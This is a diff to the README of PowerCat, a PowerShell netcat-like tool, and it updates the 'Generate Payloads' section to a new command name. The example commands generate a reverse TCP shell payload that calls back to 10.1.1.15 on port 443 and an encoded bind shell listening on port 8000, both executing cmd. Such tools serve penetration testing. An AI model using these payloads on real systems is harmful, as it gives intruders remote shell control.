@@ -110,14 +110,14 @@ Relays in PowerCat are similar to netcat relays, but you don't have to create a 
 ```
 Generate Payloads
 -----------------
-Payloads can be generated using -Payload or -Encoded parameters. 
+Payloads can be generated using New-PowerCatPayload. 
 ###
 ```powershell
     # Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
-    New-PowerCat -Client 10.1.1.15 -Port 443 -Execute cmd -Payload
+    New-PowerCatPayload -Client 10.1.1.15 -Port 443 -Execute cmd 
         
     # Generate a bind tcp encoded command which listens on port 8000:
-    New-PowerCat -Listener -Port 8000 -Execute cmd -Payload -Encoded
+    New-PowerCatPayload -Encoded -Listener -Port 8000 -Execute cmd -Payload 
 ```
 Misc Usage
 ----------
